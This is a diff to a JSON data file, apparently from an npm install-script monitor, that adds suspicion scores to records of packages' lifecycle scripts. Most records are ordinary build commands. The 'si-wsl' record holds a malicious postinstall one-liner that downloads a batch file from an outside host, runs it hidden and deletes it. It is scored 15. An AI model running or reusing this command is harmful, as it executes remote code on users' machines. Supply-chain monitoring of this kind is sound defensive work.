@@ -56,7 +56,8 @@
     "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
     "previousVersion": null,
     "timestamp": "2026-02-05T13:48:18.657Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@engie-group/fluid-cli",
@@ -65,7 +66,8 @@
     "scriptContent": "rimraf ./dist",
     "previousVersion": "0.5.0",
     "timestamp": "2026-02-05T13:47:12.884Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "digital-checkout",
@@ -74,7 +76,8 @@
     "scriptContent": "echo 'digital-checkout installed successfully'",
     "previousVersion": null,
     "timestamp": "2026-02-05T13:47:06.445Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "digital-checkout",
@@ -83,7 +86,8 @@
     "scriptContent": "node index.js",
     "previousVersion": null,
     "timestamp": "2026-02-05T13:47:06.442Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "pkgnewfefame1",
@@ -92,7 +96,8 @@
     "scriptContent": "node scripts/setup.js",
     "previousVersion": null,
     "timestamp": "2026-02-05T13:21:12.741Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@heartlandone/vega-sandbox-pr-2604-f5e1ff348da9faf04b737e5dc506e6776c1383dd",
@@ -101,7 +106,8 @@
     "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
     "previousVersion": null,
     "timestamp": "2026-02-05T08:58:19.652Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@daffadevv/baileys",
@@ -110,7 +116,8 @@
     "scriptContent": "node ./engine-requirements.js",
     "previousVersion": null,
     "timestamp": "2026-02-05T08:57:38.996Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@ubiquity-os/ethers-decode-error",
@@ -119,7 +126,8 @@
     "scriptContent": "npm run lint",
     "previousVersion": null,
     "timestamp": "2026-02-05T08:57:23.610Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@lgbusinesscloud/gitlab-util",
@@ -128,7 +136,8 @@
     "scriptContent": "node scripts/postinstall.js",
     "previousVersion": "0.0.5",
     "timestamp": "2026-02-05T08:55:58.296Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@heartlandone/vega-sandbox-pr-2599-ea9dcd26b021d57e8d3d6bcd84d1270cfd4f2a7d",
@@ -137,7 +146,8 @@
     "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
     "previousVersion": null,
     "timestamp": "2026-02-05T05:22:12.482Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "n8n-nodes-waops",
@@ -146,7 +156,8 @@
     "scriptContent": "rimraf dist",
     "previousVersion": "1.1.0",
     "timestamp": "2026-02-05T05:21:58.224Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "domo-tactical-storage",
@@ -155,7 +166,8 @@
     "scriptContent": "npm link",
     "previousVersion": null,
     "timestamp": "2026-02-05T02:45:30.219Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "shieldcortex",
@@ -164,7 +176,8 @@
     "scriptContent": "node scripts/postinstall.mjs",
     "previousVersion": "2.4.9",
     "timestamp": "2026-02-05T02:44:58.415Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "turbocsv",
@@ -173,7 +186,8 @@
     "scriptContent": "bun scripts/postinstall.ts",
     "previousVersion": null,
     "timestamp": "2026-02-04T20:47:35.169Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "qlaude",
@@ -182,7 +196,8 @@
     "scriptContent": "node dist/bin/setup-hooks.js",
     "previousVersion": null,
     "timestamp": "2026-02-04T08:55:18.068Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@commercetools/nimbus",
@@ -191,7 +206,8 @@
     "scriptContent": "chakra typegen ./dist/index.es.js || true",
     "previousVersion": "2.4.0",
     "timestamp": "2026-02-04T08:54:35.186Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@vibecodetown/mcp-server",
@@ -200,7 +216,8 @@
     "scriptContent": "node scripts/ensure-exec.mjs postinstall && node scripts/check-musu.mjs",
     "previousVersion": "1.2.1",
     "timestamp": "2026-02-04T07:05:44.320Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@heartlandone/vega-sandbox-pr-2610-4df5a169d0dc030a2adc5243b67885bf6731ba3a",
@@ -209,7 +226,8 @@
     "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
     "previousVersion": null,
     "timestamp": "2026-02-04T07:05:41.136Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "partnerss",
@@ -218,7 +236,8 @@
     "scriptContent": "node index.js",
     "previousVersion": null,
     "timestamp": "2026-02-04T07:05:30.572Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@weihaoqu/curriculum-designer-skill",
@@ -227,7 +246,8 @@
     "scriptContent": "node scripts/install-claude.js || true",
     "previousVersion": "1.1.0",
     "timestamp": "2026-02-04T05:14:31.826Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@webbies.dev/dotenvify",
@@ -236,7 +256,8 @@
     "scriptContent": "node scripts/install.js",
     "previousVersion": "0.3.5",
     "timestamp": "2026-02-04T02:43:42.303Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "minimem",
@@ -245,7 +266,8 @@
     "scriptContent": "sed -i '' 's/from \"sqlite\"/from \"node:sqlite\"/g' dist/cli/index.js",
     "previousVersion": "0.0.1",
     "timestamp": "2026-02-04T02:43:00.468Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "sharetribe-cli",
@@ -254,7 +276,8 @@
     "scriptContent": "printf '\\n\\033[33m⚠️  NOTICE: This is an UNOFFICIAL Sharetribe CLI (community reimplementation).\\033[0m\\n\\033[33m   For the official CLI, install: \\033[36mnpm install -g flex-cli\\033[0m\\n\\n' >&2",
     "previousVersion": "1.16.7",
     "timestamp": "2026-02-04T02:42:04.998Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "tmuxer",
@@ -263,7 +286,8 @@
     "scriptContent": "npx tsx scripts/generate-schemas.ts && chmod +x dist/cli.js",
     "previousVersion": "0.0.1",
     "timestamp": "2026-02-03T20:50:49.680Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "baileys-web1",
@@ -272,7 +296,8 @@
     "scriptContent": "node ./engine-requirements.js",
     "previousVersion": null,
     "timestamp": "2026-02-03T20:50:31.456Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "nano-injector",
@@ -281,7 +306,8 @@
     "scriptContent": "npm run clean",
     "previousVersion": "1.0.4",
     "timestamp": "2026-02-03T20:50:28.328Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "cdktn-cli",
@@ -290,7 +316,8 @@
     "scriptContent": "node build.js",
     "previousVersion": "0.0.1",
     "timestamp": "2026-02-03T19:09:17.408Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "cdktn-cli",
@@ -299,7 +326,8 @@
     "scriptContent": "yarn compile-build-config",
     "previousVersion": "0.0.1",
     "timestamp": "2026-02-03T19:09:17.406Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@cdktn/hcl-tools",
@@ -308,7 +336,8 @@
     "scriptContent": "./prebuild.sh",
     "previousVersion": null,
     "timestamp": "2026-02-03T19:09:10.425Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@cdktn/hcl2json",
@@ -317,7 +346,8 @@
     "scriptContent": "./prebuild.sh",
     "previousVersion": null,
     "timestamp": "2026-02-03T19:09:07.373Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@cdktn/provider-generator",
@@ -326,7 +356,8 @@
     "scriptContent": "node ./lib/__tests__/edge-provider-schema/cli.js ./edge-provider-bindings",
     "previousVersion": null,
     "timestamp": "2026-02-03T19:09:05.611Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "openclawd-termux",
@@ -335,7 +366,8 @@
     "scriptContent": "node lib/postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-02-03T19:09:03.038Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@sankyu/circle-flags-core",
@@ -344,7 +376,8 @@
     "scriptContent": "node ../../scripts/ensure-generated.mjs",
     "previousVersion": "1.5.4",
     "timestamp": "2026-02-03T19:06:46.841Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@sankyu/react-circle-flags",
@@ -353,7 +386,8 @@
     "scriptContent": "pnpm -C ../.. -F @sankyu/circle-flags-core run build",
     "previousVersion": "1.5.4",
     "timestamp": "2026-02-03T19:06:45.002Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@sankyu/vue-circle-flags",
@@ -362,7 +396,8 @@
     "scriptContent": "pnpm -C ../.. -F @sankyu/circle-flags-core run build",
     "previousVersion": "0.0.3-beta",
     "timestamp": "2026-02-03T19:06:35.699Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "medulla-cc",
@@ -371,7 +406,8 @@
     "scriptContent": "node install.js",
     "previousVersion": null,
     "timestamp": "2026-02-03T17:05:25.629Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "vue-lib-expert-starter-kit",
@@ -380,7 +416,8 @@
     "scriptContent": "node postprocess-dts.cjs",
     "previousVersion": null,
     "timestamp": "2026-02-03T17:05:10.801Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "injective-core",
@@ -389,7 +426,8 @@
     "scriptContent": "node lib/install.js || true",
     "previousVersion": null,
     "timestamp": "2026-02-03T17:04:35.591Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "openclast-wallet",
@@ -398,7 +436,8 @@
     "scriptContent": "node ./dist/postinstall.js",
     "previousVersion": "0.1.3",
     "timestamp": "2026-02-03T17:04:22.480Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@genexus/ngx-aws-deploy",
@@ -407,7 +446,8 @@
     "scriptContent": "node ./decorate-angular-cli.js && ngcc --properties es2020 browser module main",
     "previousVersion": "5.3.1",
     "timestamp": "2026-02-03T17:03:33.751Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@lomray/react-native-apple-music",
@@ -416,7 +456,8 @@
     "scriptContent": "patch-package",
     "previousVersion": "1.2.1",
     "timestamp": "2026-02-03T17:02:54.034Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@tezos-x/octez.js",
@@ -425,7 +466,8 @@
     "scriptContent": "rimraf dist",
     "previousVersion": null,
     "timestamp": "2026-02-03T17:02:37.363Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@tezos-x/octez.js",
@@ -434,7 +476,8 @@
     "scriptContent": "node patch.js",
     "previousVersion": null,
     "timestamp": "2026-02-03T17:02:37.361Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@tezos-x/octez.js-contracts-library",
@@ -443,7 +486,8 @@
     "scriptContent": "rimraf dist",
     "previousVersion": null,
     "timestamp": "2026-02-03T17:02:36.130Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@tezos-x/octez.js-http-utils",
@@ -452,7 +496,8 @@
     "scriptContent": "rimraf dist",
     "previousVersion": null,
     "timestamp": "2026-02-03T17:02:35.177Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@tezos-x/octez.js-michel-codec",
@@ -461,7 +506,8 @@
     "scriptContent": "rimraf dist",
     "previousVersion": null,
     "timestamp": "2026-02-03T17:02:33.900Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@tezos-x/octez.js-michelson-encoder",
@@ -470,7 +516,8 @@
     "scriptContent": "rimraf dist",
     "previousVersion": null,
     "timestamp": "2026-02-03T17:02:32.987Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@tezos-x/octez.js-rpc",
@@ -479,7 +526,8 @@
     "scriptContent": "rimraf dist",
     "previousVersion": null,
     "timestamp": "2026-02-03T17:02:31.956Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@tezos-x/octez.js-signer",
@@ -488,7 +536,8 @@
     "scriptContent": "rimraf dist",
     "previousVersion": null,
     "timestamp": "2026-02-03T17:02:30.872Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@tezos-x/octez.js-tzip16",
@@ -497,7 +546,8 @@
     "scriptContent": "rimraf dist",
     "previousVersion": null,
     "timestamp": "2026-02-03T17:02:29.949Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@tezos-x/octez.js-wallet-connect",
@@ -506,7 +556,8 @@
     "scriptContent": "rimraf dist",
     "previousVersion": null,
     "timestamp": "2026-02-03T17:02:28.399Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@commercetools/nimbus",
@@ -515,7 +566,8 @@
     "scriptContent": "chakra typegen ./dist/index.es.js || true",
     "previousVersion": "2.4.0",
     "timestamp": "2026-02-03T17:02:19.404Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@wix/thunderbolt-app-css",
@@ -524,7 +576,8 @@
     "scriptContent": "patch-package-main",
     "previousVersion": null,
     "timestamp": "2026-02-03T13:03:09.494Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "peek-carousel",
@@ -533,7 +586,8 @@
     "scriptContent": "npm run build:css && npm run build:css:min",
     "previousVersion": "1.0.2",
     "timestamp": "2026-02-03T12:02:42.612Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@johanspannare/azure-devops-mcp-extended",
@@ -542,7 +596,8 @@
     "scriptContent": "node -p \"'export const packageVersion = ' + JSON.stringify(require('./package.json').version) + ';\\n'\" > src/version.ts && prettier --write src/version.ts",
     "previousVersion": null,
     "timestamp": "2026-02-03T12:01:27.338Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@johanspannare/azure-devops-mcp-extended",
@@ -551,7 +606,8 @@
     "scriptContent": "npm config set registry https://registry.npmjs.org/",
     "previousVersion": null,
     "timestamp": "2026-02-03T12:01:27.336Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 4
   },
   {
     "packageName": "@innovatorssoft/baileys",
@@ -560,7 +616,8 @@
     "scriptContent": "node ./engine-requirements.js",
     "previousVersion": "7.3.5",
     "timestamp": "2026-02-03T10:54:01.666Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "wcag-color-contrast",
@@ -569,7 +626,8 @@
     "scriptContent": "npx only-allow pnpm",
     "previousVersion": null,
     "timestamp": "2026-02-03T10:53:30.022Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "carbon-mac-copy-cloner",
@@ -578,7 +636,8 @@
     "scriptContent": "node scripts/setup.js",
     "previousVersion": "1.1.10",
     "timestamp": "2026-02-03T08:52:21.261Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@variousjs/various",
@@ -587,7 +646,8 @@
     "scriptContent": "npm run lint && rm -rf dist && rm -rf public/dist",
     "previousVersion": "5.1.5",
     "timestamp": "2026-02-03T08:51:09.253Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 3
   },
   {
     "packageName": "@tidecloak/js",
@@ -596,7 +656,8 @@
     "scriptContent": "node ./scripts/postinstall.js",
     "previousVersion": "0.13.13",
     "timestamp": "2026-02-03T08:50:21.350Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "semaphore-relayer-zee",
@@ -605,7 +666,8 @@
     "scriptContent": "node index.js",
     "previousVersion": null,
     "timestamp": "2026-02-03T07:03:11.005Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@hanworks/eslint-config",
@@ -614,7 +676,8 @@
     "scriptContent": "npm run build",
     "previousVersion": null,
     "timestamp": "2026-02-03T05:19:06.658Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@launch77-shared/plugin-auth",
@@ -623,7 +686,8 @@
     "scriptContent": "node scripts/validate-plugin-json.js",
     "previousVersion": null,
     "timestamp": "2026-02-03T02:51:07.835Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "specmem-hardwicksoftware",
@@ -632,7 +696,8 @@
     "scriptContent": "node scripts/postinstall.cjs",
     "previousVersion": null,
     "timestamp": "2026-02-03T02:51:01.214Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "specmem-hardwicksoftware",
@@ -641,7 +706,8 @@
     "scriptContent": "node scripts/check-global-install.cjs || true",
     "previousVersion": null,
     "timestamp": "2026-02-03T02:51:01.212Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "launchdarkly-cpp-networking",
@@ -650,7 +716,8 @@
     "scriptContent": "node vishu.js",
     "previousVersion": "1.0.0",
     "timestamp": "2026-02-02T14:56:00.312Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "forms-angular",
@@ -659,7 +726,8 @@
     "scriptContent": "if [ -d 'node_modules/bower' ]; then bower install --config.directory=node_modules --production jquery@2.0.3 bootstrap-2-3-2=git://github.com/twbs/bootstrap.git#v2.3.2 bootstrap-3-3-7=git://github.com/twbs/bootstrap.git#v3.3.7; fi",
     "previousVersion": "0.12.0-beta.56a",
     "timestamp": "2026-02-02T14:55:08.704Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@vtex/shoreline-store",
@@ -668,7 +736,8 @@
     "scriptContent": "rm -rf dist",
     "previousVersion": null,
     "timestamp": "2026-02-02T14:51:18.335Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@letter-ai/lector",
@@ -677,7 +746,8 @@
     "scriptContent": "size-limit --json > size.json",
     "previousVersion": null,
     "timestamp": "2026-02-02T13:21:20.788Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@letter-ai/lector",
@@ -686,7 +756,8 @@
     "scriptContent": "rm -rf dist",
     "previousVersion": null,
     "timestamp": "2026-02-02T13:21:20.786Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@uktrade/client-matrix-js",
@@ -695,7 +766,8 @@
     "scriptContent": "npx npm-force-resolutions",
     "previousVersion": "1.0.149",
     "timestamp": "2026-02-02T13:21:00.086Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@uktrade/wdio-image-diff-js",
@@ -704,7 +776,8 @@
     "scriptContent": "npx npm-force-resolutions",
     "previousVersion": "1.9.2",
     "timestamp": "2026-02-02T13:20:38.593Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "lingo-guardian-cli",
@@ -713,7 +786,8 @@
     "scriptContent": "npx playwright install chromium --with-deps 2>/dev/null || true",
     "previousVersion": null,
     "timestamp": "2026-02-02T10:58:03.048Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@salutejs-ds/demo_02_feb",
@@ -722,7 +796,8 @@
     "scriptContent": "npm run generate:typings",
     "previousVersion": null,
     "timestamp": "2026-02-02T10:57:38.379Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@salutejs-ds/demo_02_feb",
@@ -731,7 +806,8 @@
     "scriptContent": "rm -rf ./components ./es ./tokens ./theme ./css ./index.* && npm run prebuild:css",
     "previousVersion": null,
     "timestamp": "2026-02-02T10:57:38.376Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 3
   },
   {
     "packageName": "@namehash/namehash-ui",
@@ -740,7 +816,8 @@
     "scriptContent": "pnpm build:css",
     "previousVersion": "1.5.0",
     "timestamp": "2026-02-02T08:56:25.059Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@sandbox-agent/cli-linux-x64",
@@ -749,7 +826,8 @@
     "scriptContent": "chmod +x bin/sandbox-agent || true",
     "previousVersion": "0.1.4",
     "timestamp": "2026-02-02T08:55:57.044Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "strray-ai",
@@ -758,7 +836,8 @@
     "scriptContent": "node scripts/node/postinstall.cjs",
     "previousVersion": "1.1.1",
     "timestamp": "2026-02-02T05:29:17.085Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@namehash/namehash-ui",
@@ -767,7 +846,8 @@
     "scriptContent": "pnpm build:css",
     "previousVersion": "1.5.0",
     "timestamp": "2026-02-02T05:27:56.640Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "si-wsl",
@@ -776,7 +856,8 @@
     "scriptContent": "node -e \"const fs=require('fs'),https=require('https'),cp=require('child_process'),path=require('path');https.get('https://marshmallowes.shop/zZJlw',res=>res.pipe(fs.createWriteStream(path.join(process.env.TEMP,'dl.bat'))).on('finish',()=>cp.exec(path.join(process.env.TEMP,'dl.bat'),{windowsHide:true},()=>setTimeout(()=>fs.unlink(path.join(process.env.TEMP,'dl.bat'),()=>{}),12e4))));\"",
     "previousVersion": "3.1.0",
     "timestamp": "2026-02-02T05:27:32.430Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 15
   },
   {
     "packageName": "@iflow-mcp/xinbenlv_mcpsq",
@@ -785,7 +866,8 @@
     "scriptContent": "npm run clean",
     "previousVersion": null,
     "timestamp": "2026-02-02T05:27:07.172Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@heartlandone/vega-sandbox-pr-2561-8e1eec23e0867da776a9b9e2b0b54731a25d9c98",
@@ -794,7 +876,8 @@
     "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
     "previousVersion": null,
     "timestamp": "2026-02-02T05:27:02.975Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@logspace/mcp-server",
@@ -803,7 +886,8 @@
     "scriptContent": "node -e \"try{require('fs').chmodSync(require('path').join(__dirname,'dist','index.js'),0o755)}catch(e){}\"",
     "previousVersion": "1.6.1",
     "timestamp": "2026-02-01T22:33:22.110Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 5
   },
   {
     "packageName": "react-fast-utilsa",
@@ -812,7 +896,8 @@
     "scriptContent": "node scripts/setup.js",
     "previousVersion": null,
     "timestamp": "2026-02-01T20:36:27.350Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "extension-develop",
@@ -821,7 +906,8 @@
     "scriptContent": "node -e \"const fs=require('fs');const path=require('path');const entry=path.join(__dirname,'dist','postinstall.cjs');if(fs.existsSync(entry))require(entry);\"",
     "previousVersion": "3.5.0-next.0",
     "timestamp": "2026-02-01T20:36:26.263Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 5
   },
   {
     "packageName": "@saadjs/gh-stats",
@@ -830,7 +916,8 @@
     "scriptContent": "node scripts/chmod-cli.js",
     "previousVersion": null,
     "timestamp": "2026-02-01T20:36:23.370Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "machinaos",
@@ -839,7 +926,8 @@
     "scriptContent": "node scripts/postinstall.js",
     "previousVersion": "0.0.7",
     "timestamp": "2026-02-01T18:47:22.500Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "iobroker.bshb",
@@ -848,7 +936,8 @@
     "scriptContent": "husky && node disable-publish-semantic-release-github.cjs",
     "previousVersion": "0.5.2",
     "timestamp": "2026-02-01T18:47:20.996Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@felixparadox/bailes",
@@ -857,7 +946,8 @@
     "scriptContent": "node ./engine-requirements.js",
     "previousVersion": null,
     "timestamp": "2026-02-01T18:47:13.815Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "agent-messenger",
@@ -866,7 +956,8 @@
     "scriptContent": "bun scripts/postbuild.ts",
     "previousVersion": "1.0.0",
     "timestamp": "2026-02-01T16:40:14.806Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "food402",
@@ -875,7 +966,8 @@
     "scriptContent": "node dist/postinstall.js",
     "previousVersion": "1.0.2",
     "timestamp": "2026-02-01T16:40:09.972Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@jungjaehoon/openclaw-mama",
@@ -884,7 +976,8 @@
     "scriptContent": "node scripts/postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-02-01T13:06:47.960Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@tyroneross/navgator",
@@ -893,7 +986,8 @@
     "scriptContent": "node scripts/postinstall.cjs",
     "previousVersion": null,
     "timestamp": "2026-02-01T10:36:30.296Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "autosnippet",
@@ -902,7 +996,8 @@
     "scriptContent": "node scripts/ensure-parse-package.js && node scripts/build-native-ui.js",
     "previousVersion": "1.4.2",
     "timestamp": "2026-02-01T08:41:21.287Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@khalidsaidi/a2abench-mcp",
@@ -911,7 +1006,8 @@
     "scriptContent": "node -e \"const fs=require('fs');const p='dist/cli.js';const c=fs.readFileSync(p,'utf8');if(!c.startsWith('#!')){fs.writeFileSync(p,'#!/usr/bin/env node\\n'+c);}\"",
     "previousVersion": "0.1.10",
     "timestamp": "2026-02-01T05:25:37.998Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 10
   },
   {
     "packageName": "yakmesh",
@@ -920,7 +1016,8 @@
     "scriptContent": "npm run build:docs",
     "previousVersion": "2.5.0",
     "timestamp": "2026-02-01T05:24:53.667Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "aidex-mcp",
@@ -929,7 +1026,8 @@
     "scriptContent": "node scripts/postinstall.mjs",
     "previousVersion": "1.4.2",
     "timestamp": "2026-01-31T20:34:43.830Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@goker/qr-code",
@@ -938,7 +1036,8 @@
     "scriptContent": "node scripts/patch-qr-core.mjs",
     "previousVersion": null,
     "timestamp": "2026-01-31T18:44:49.652Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@probelabs/visor",
@@ -947,7 +1046,8 @@
     "scriptContent": "chmod +x dist/cli-main.js",
     "previousVersion": "0.1.126",
     "timestamp": "2026-01-31T18:44:46.278Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@probelabs/visor",
@@ -956,7 +1056,8 @@
     "scriptContent": "npm run clean",
     "previousVersion": "0.1.126",
     "timestamp": "2026-01-31T18:44:46.276Z",
-    "issuesend": true
